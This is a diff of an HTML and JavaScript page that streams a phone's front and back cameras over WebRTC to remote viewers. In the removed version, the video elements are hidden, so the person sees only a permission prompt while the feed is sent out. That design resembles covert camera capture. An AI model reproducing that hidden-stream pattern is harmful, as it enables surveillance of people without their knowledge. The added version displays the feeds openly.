@@ -1,793 +1,484 @@
 <!doctype html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Camera Access</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Camera A</title>
 
-<style>
-body{
-  margin:0;
-  background:#111;
-  color:#fff;
-  font-family:Arial,sans-serif;
-  text-align:center;
-  padding:20px;
-}
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-#status{
-  font-size:18px;
-  margin:15px;
-}
+    body {
+      margin: 0;
+      background: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 15px;
+    }
 
-#error{
-  color:#ff8888;
-  margin:12px;
-}
+    h1 {
+      margin: 8px 0;
+    }
 
-#content{
-  display:none;
-}
+    #status {
+      margin: 12px auto;
+      padding: 12px;
+      border-radius: 8px;
+      background: #222;
+      max-width: 700px;
+    }
 
-button{
-  padding:14px 22px;
-  border:0;
-  border-radius:8px;
-  font-size:16px;
-  font-weight:bold;
-  cursor:pointer;
-}
+    .online {
+      color: #00ff66;
+    }
 
-#allowBtn{
-  background:#fff;
-  color:#111;
-}
+    .warning {
+      color: #ffd000;
+    }
 
-#retryBtn{
-  display:none;
-}
+    .error {
+      color: #ff5555;
+    }
 
-#frontVideo,
-#backVideo{
-  display:none;
-}
-</style>
+    button {
+      border: 0;
+      border-radius: 8px;
+      padding: 12px 18px;
+      margin: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    #startBtn {
+      background: #00aaff;
+      color: white;
+    }
+
+    #stopBtn {
+      background: #d33;
+      color: white;
+    }
+
+    .cameras {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      max-width: 1100px;
+      margin: 20px auto;
+    }
+
+    .cameraBox {
+      position: relative;
+      background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+      min-height: 240px;
+    }
+
+    video {
+      display: block;
+      width: 100%;
+      height: auto;
+      min-height: 240px;
+      object-fit: cover;
+      background: #000;
+    }
+
+    .label {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      z-index: 5;
+      background: rgba(0,0,0,.7);
+      padding: 7px 10px;
+      border-radius: 7px;
+      font-weight: bold;
+    }
+
+    .fullscreen {
+      position: absolute;
+      right: 10px;
+      bottom: 10px;
+      z-index: 5;
+      background: rgba(0,0,0,.75);
+      color: white;
+      padding: 9px 12px;
+      border-radius: 7px;
+    }
+
+    @media (max-width: 700px) {
+      .cameras {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
 </head>
 
 <body>
 
-<h1>Camera Access</h1>
+  <h1>Camera A</h1>
 
-<div id="status">
-  Allow camera permission to start the live camera.
-</div>
+  <div id="status">
+    Camera permission is required.
+  </div>
 
-<div id="error"></div>
+  <button id="startBtn">
+    Allow Camera & Start
+  </button>
 
-<button id="allowBtn">
-  Allow Camera
-</button>
+  <button id="stopBtn">
+    Stop Cameras
+  </button>
 
-<button id="retryBtn">
-  Try Again
-</button>
+  <div class="cameras">
 
-<div id="content">
-  <p>🟢 Camera permission granted.</p>
-</div>
+    <div class="cameraBox">
+      <div class="label">📷 Front Camera</div>
 
-<video
-  id="frontVideo"
-  autoplay
-  muted
-  playsinline>
-</video>
+      <video
+        id="frontVideo"
+        autoplay
+        muted
+        playsinline>
+      </video>
 
-<video
-  id="backVideo"
-  autoplay
-  muted
-  playsinline>
-</video>
+      <button
+        class="fullscreen"
+        onclick="fullscreenVideo('frontVideo')">
+        ⛶ Full Screen
+      </button>
+    </div>
+
+    <div class="cameraBox">
+      <div class="label">📷 Back Camera</div>
+
+      <video
+        id="backVideo"
+        autoplay
+        muted
+        playsinline>
+      </video>
+
+      <button
+        class="fullscreen"
+        onclick="fullscreenVideo('backVideo')">
+        ⛶ Full Screen
+      </button>
+    </div>
+
+  </div>
 
 <script>
+const statusBox = document.getElementById("status");
+const startBtn = document.getElementById("startBtn");
+const stopBtn = document.getElementById("stopBtn");
 
-const status =
-  document.getElementById("status");
-
-const errorBox =
-  document.getElementById("error");
-
-const content =
-  document.getElementById("content");
-
-const allowBtn =
-  document.getElementById("allowBtn");
-
-const retryBtn =
-  document.getElementById("retryBtn");
-
-const frontVideo =
-  document.getElementById("frontVideo");
-
-const backVideo =
-  document.getElementById("backVideo");
-
+const frontVideo = document.getElementById("frontVideo");
+const backVideo = document.getElementById("backVideo");
 
 let frontStream = null;
 let backStream = null;
 
-const peers =
-  new Map();
+let frontPC = null;
+let backPC = null;
 
-const pendingCandidates =
-  new Map();
+let viewerConnected = false;
 
+const wsProtocol =
+  location.protocol === "https:" ? "wss:" : "ws:";
 
-const ws =
-  new WebSocket(
-
-    (location.protocol === "https:"
-      ? "wss:"
-      : "ws:") +
-
-    "//" +
-    location.host +
-    "/camera"
-
-  );
-
-
-function send(message){
-
-  if(
-    ws.readyState ===
-    WebSocket.OPEN
-  ){
-
-    ws.send(
-      JSON.stringify(message)
-    );
-
-  }
-
-}
-
-
-function stopStreams(){
-
-  for(
-    const stream of [
-      frontStream,
-      backStream
-    ]
-  ){
-
-    if(stream){
-
-      stream
-        .getTracks()
-        .forEach(
-          track => track.stop()
-        );
-
-    }
-
-  }
-
-  frontStream = null;
-  backStream = null;
-
-}
-
-
-/*
-  Try FRONT camera first.
-
-  If the browser/phone does not allow it,
-  try the BACK camera.
-
-  This means at least one camera can work.
-*/
-
-async function openOneCamera(){
-
-  try{
-
-    frontStream =
-      await navigator
-        .mediaDevices
-        .getUserMedia({
-
-          video:{
-            facingMode:{
-              ideal:"user"
-            }
-          },
-
-          audio:false
-
-        });
-
-
-    frontVideo.srcObject =
-      frontStream;
-
-
-    await frontVideo
-      .play()
-      .catch(() => {});
-
-
-    return "front";
-
-  }
-
-  catch(error){
-
-    console.warn(
-      "Front camera unavailable:",
-      error
-    );
-
-  }
-
-
-  try{
-
-    backStream =
-      await navigator
-        .mediaDevices
-        .getUserMedia({
-
-          video:{
-            facingMode:{
-              ideal:"environment"
-            }
-          },
-
-          audio:false
-
-        });
-
-
-    backVideo.srcObject =
-      backStream;
-
-
-    await backVideo
-      .play()
-      .catch(() => {});
-
-
-    return "back";
-
-  }
-
-  catch(error){
-
-    console.warn(
-      "Back camera unavailable:",
-      error
-    );
-
-    throw error;
-
-  }
-
-}
-
-
-async function startCamera(){
-
-  stopStreams();
-
-  allowBtn.disabled = true;
-
-  retryBtn.style.display =
-    "none";
-
-  errorBox.textContent =
-    "";
-
-  status.textContent =
-    "🟡 Requesting camera permission...";
-
-
-  if(
-    !navigator.mediaDevices ||
-    !navigator.mediaDevices.getUserMedia
-  ){
-
-    errorBox.textContent =
-      "❌ Camera requires HTTPS or localhost.";
-
-    status.textContent =
-      "Camera unavailable";
-
-    allowBtn.disabled =
-      false;
-
-    retryBtn.style.display =
-      "inline-block";
-
-    return;
-
-  }
-
-
-  try{
-
-    const camera =
-      await openOneCamera();
-
-
-    content.style.display =
-      "block";
-
-
-    status.textContent =
-      camera === "front"
-        ? "🟢 Front camera is LIVE"
-        : "🟢 Back camera is LIVE";
-
-
-    allowBtn.style.display =
-      "none";
-
-
-    announceCameraLive();
-
-  }
-
-  catch(error){
-
-    console.error(
-      "Camera error:",
-      error
-    );
-
-
-    status.textContent =
-      "🔒 Camera permission required";
-
-
-    errorBox.textContent =
-      "❌ No camera could be opened. Please allow camera permission and try again.";
-
-
-    allowBtn.disabled =
-      false;
-
-
-    retryBtn.style.display =
-      "inline-block";
-
-  }
-
-}
-
-
-function announceCameraLive(){
-
-  if(
-    frontStream ||
-    backStream
-  ){
-
-    send({
-
-      type:"camera-live",
-
-      cameras:{
-        front:!!frontStream,
-        back:!!backStream
-      }
-
-    });
-
-  }
-
-}
-
-
-async function createPeer(viewerId){
-
-  const old =
-    peers.get(viewerId);
-
-
-  if(old){
-
-    try{
-
-      old.close();
-
-    }
-
-    catch(error){}
-
-  }
-
-
-  const pc =
-    new RTCPeerConnection({
-
-      iceServers:[
-        {
-          urls:
-            "stun:stun.l.google.com:19302"
-        }
-      ]
-
-    });
-
-
-  peers.set(
-    viewerId,
-    pc
-  );
-
-
-  pendingCandidates.set(
-    viewerId,
-    []
-  );
-
-
-  /*
-    Add whichever camera actually works.
-  */
-
-  if(frontStream){
-
-    frontStream
-      .getTracks()
-      .forEach(
-        track => {
-
-          pc.addTrack(
-            track,
-            frontStream
-          );
-
-        }
-      );
-
-  }
-
-
-  if(backStream){
-
-    backStream
-      .getTracks()
-      .forEach(
-        track => {
-
-          pc.addTrack(
-            track,
-            backStream
-          );
-
-        }
-      );
-
-  }
-
-
-  pc.onicecandidate =
-    event => {
-
-      if(event.candidate){
-
-        send({
-
-          type:"candidate",
-
-          candidate:
-            event.candidate,
-
-          toViewerId:
-            viewerId
-
-        });
-
-      }
-
-    };
-
-
-  const offer =
-    await pc.createOffer();
-
-
-  await pc.setLocalDescription(
-    offer
-  );
-
-
-  send({
-
-    type:"offer",
-
-    offer:
-      pc.localDescription,
-
-    toViewerId:
-      viewerId
-
-  });
-
-}
-
-
-allowBtn.onclick =
-  startCamera;
-
-
-retryBtn.onclick =
-  startCamera;
-
-
-ws.onmessage =
-  async event => {
-
-    let msg;
-
-
-    try{
-
-      msg =
-        JSON.parse(
-          event.data
-        );
-
-    }
-
-    catch(error){
-
-      return;
-
-    }
-
-
-    if(
-      msg.type ===
-      "viewer-ready"
-    ){
-
-      if(
-        frontStream ||
-        backStream
-      ){
-
-        try{
-
-          await createPeer(
-            msg.viewerId
-          );
-
-        }
-
-        catch(error){
-
-          console.error(
-            error
-          );
-
-        }
-
-      }
-
-      return;
-
-    }
-
-
-    if(
-      msg.type ===
-      "answer"
-    ){
-
-      const viewerId =
-        msg.toViewerId ||
-        msg.viewerId;
-
-
-      const pc =
-        peers.get(
-          viewerId
-        );
-
-
-      if(
-        !pc ||
-        !msg.answer
-      ){
-
-        return;
-
-      }
-
-
-      try{
-
-        await pc.setRemoteDescription(
-          msg.answer
-        );
-
-
-        const queue =
-          pendingCandidates.get(
-            viewerId
-          ) || [];
-
-
-        for(
-          const candidate of
-          queue
-        ){
-
-          await pc
-            .addIceCandidate(
-              candidate
-            )
-            .catch(
-              () => {}
-            );
-
-        }
-
-
-        pendingCandidates.set(
-          viewerId,
-          []
-        );
-
-      }
-
-      catch(error){
-
-        console.error(
-          error
-        );
-
-      }
-
-
-      return;
-
-    }
-
-
-    if(
-      msg.type ===
-      "candidate"
-    ){
-
-      const viewerId =
-        msg.toViewerId ||
-        msg.viewerId;
-
-
-      const pc =
-        peers.get(
-          viewerId
-        );
-
-
-      if(
-        !pc ||
-        !msg.candidate
-      ){
-
-        return;
-
-      }
-
-
-      if(
-        pc.remoteDescription
-      ){
-
-        await pc
-          .addIceCandidate(
-            msg.candidate
-          )
-          .catch(
-            () => {}
-          );
-
-      }
-
-      else{
-
-        const queue =
-          pendingCandidates.get(
-            viewerId
-          );
-
-
-        if(queue){
-
-          queue.push(
-            msg.candidate
-          );
-
-        }
-
-      }
-
-
-      return;
-
-    }
-
-
-    if(
-      msg.type ===
-      "viewer-left"
-    ){
-
-      const pc =
-        peers.get(
-          msg.viewerId
-        );
-
-
-      if(pc){
-
-        pc.close();
-
-      }
-
-
-      peers.delete(
-        msg.viewerId
-      );
-
-
-      pendingCandidates.delete(
-        msg.viewerId
-      );
-
-    }
-
-  };
-
-
-ws.onclose =
-  () => {
-
-    status.textContent =
-      "🔴 Server connection closed";
-
-  };
-
-
-window.addEventListener(
-  "beforeunload",
-  () => {
-
-    stopStreams();
-
-
-    peers.forEach(
-      pc => pc.close()
-    );
-
-
-    if(
-      ws.readyState ===
-      WebSocket.OPEN
-    ){
-
-      ws.close();
-
-    }
-
-  }
+const ws = new WebSocket(
+  wsProtocol + "//" + location.host
 );
 
+function setStatus(text, className = "") {
+  statusBox.textContent = text;
+  statusBox.className = className;
+}
+
+ws.onopen = () => {
+  ws.send(JSON.stringify({
+    type: "register",
+    role: "camera"
+  }));
+
+  setStatus(
+    "Camera A connected. Waiting for Viewer...",
+    "warning"
+  );
+};
+
+ws.onclose = () => {
+  setStatus(
+    "Server connection lost.",
+    "error"
+  );
+};
+
+ws.onmessage = async (event) => {
+  let msg;
+
+  try {
+    msg = JSON.parse(event.data);
+  } catch {
+    return;
+  }
+
+  if (msg.type === "viewer-online") {
+    viewerConnected = true;
+
+    setStatus(
+      "Viewer connected. Start your cameras.",
+      "online"
+    );
+
+    if (frontStream || backStream) {
+      await createOffers();
+    }
+  }
+
+  if (msg.type === "viewer-offline") {
+    viewerConnected = false;
+
+    if (frontPC) {
+      frontPC.close();
+      frontPC = null;
+    }
+
+    if (backPC) {
+      backPC.close();
+      backPC = null;
+    }
+
+    setStatus(
+      "Viewer disconnected.",
+      "warning"
+    );
+  }
+
+  if (msg.type === "answer") {
+    if (msg.camera === "front" && frontPC) {
+      await frontPC.setRemoteDescription(
+        new RTCSessionDescription(msg.answer)
+      );
+    }
+
+    if (msg.camera === "back" && backPC) {
+      await backPC.setRemoteDescription(
+        new RTCSessionDescription(msg.answer)
+      );
+    }
+  }
+
+  if (msg.type === "candidate") {
+    try {
+      if (msg.camera === "front" && frontPC) {
+        await frontPC.addIceCandidate(msg.candidate);
+      }
+
+      if (msg.camera === "back" && backPC) {
+        await backPC.addIceCandidate(msg.candidate);
+      }
+    } catch (e) {
+      console.log("ICE error:", e);
+    }
+  }
+};
+
+async function startCameras() {
+  stopCameras();
+
+  setStatus(
+    "Requesting camera permission...",
+    "warning"
+  );
+
+  try {
+    frontStream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: {
+          ideal: "user"
+        }
+      },
+      audio: false
+    });
+
+    frontVideo.srcObject = frontStream;
+
+  } catch (error) {
+    console.error(error);
+
+    setStatus(
+      "Front camera permission was denied or unavailable.",
+      "error"
+    );
+  }
+
+  try {
+    backStream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: {
+          ideal: "environment"
+        }
+      },
+      audio: false
+    });
+
+    backVideo.srcObject = backStream;
+
+  } catch (error) {
+    console.error(error);
+
+    setStatus(
+      "Front camera is available, but this device/browser could not open the back camera at the same time.",
+      "warning"
+    );
+  }
+
+  if (!frontStream && !backStream) {
+    setStatus(
+      "No camera was started. Please allow camera permission.",
+      "error"
+    );
+
+    return;
+  }
+
+  if (viewerConnected) {
+    await createOffers();
+  } else {
+    setStatus(
+      "Camera permission granted. Waiting for Viewer...",
+      "online"
+    );
+  }
+}
+
+async function createPeer(stream, cameraName) {
+  const pc = new RTCPeerConnection({
+    iceServers: [
+      {
+        urls: "stun:stun.l.google.com:19302"
+      }
+    ]
+  });
+
+  stream.getTracks().forEach(track => {
+    pc.addTrack(track, stream);
+  });
+
+  pc.onicecandidate = event => {
+    if (event.candidate) {
+      ws.send(JSON.stringify({
+        type: "candidate",
+        camera: cameraName,
+        candidate: event.candidate
+      }));
+    }
+  };
+
+  return pc;
+}
+
+async function createOffers() {
+
+  if (!viewerConnected) {
+    return;
+  }
+
+  if (frontStream) {
+    if (frontPC) {
+      frontPC.close();
+    }
+
+    frontPC = await createPeer(
+      frontStream,
+      "front"
+    );
+
+    const offer = await frontPC.createOffer();
+
+    await frontPC.setLocalDescription(offer);
+
+    ws.send(JSON.stringify({
+      type: "offer",
+      camera: "front",
+      offer: offer
+    }));
+  }
+
+  if (backStream) {
+    if (backPC) {
+      backPC.close();
+    }
+
+    backPC = await createPeer(
+      backStream,
+      "back"
+    );
+
+    const offer = await backPC.createOffer();
+
+    await backPC.setLocalDescription(offer);
+
+    ws.send(JSON.stringify({
+      type: "offer",
+      camera: "back",
+      offer: offer
+    }));
+  }
+}
+
+function stopCameras() {
+
+  if (frontPC) {
+    frontPC.close();
+    frontPC = null;
+  }
+
+  if (backPC) {
+    backPC.close();
+    backPC = null;
+  }
+
+  if (frontStream) {
+    frontStream.getTracks().forEach(
+      track => track.stop()
+    );
+
+    frontStream = null;
+  }
+
+  if (backStream) {
+    backStream.getTracks().forEach(
+      track => track.stop()
+    );
+
+    backStream = null;
+  }
+
+  frontVideo.srcObject = null;
+  backVideo.srcObject = null;
+}
+
+async function fullscreenVideo(id) {
+  const video = document.getElementById(id);
+
+  try {
+    if (video.requestFullscreen) {
+      await video.requestFullscreen();
+    } else if (video.webkitEnterFullscreen) {
+      video.webkitEnterFullscreen();
+    }
+  } catch (error) {
+    console.log(error);
+  }
+}
+
+startBtn.onclick = startCameras;
+stopBtn.onclick = stopCameras;
 </script>
 
 </body>
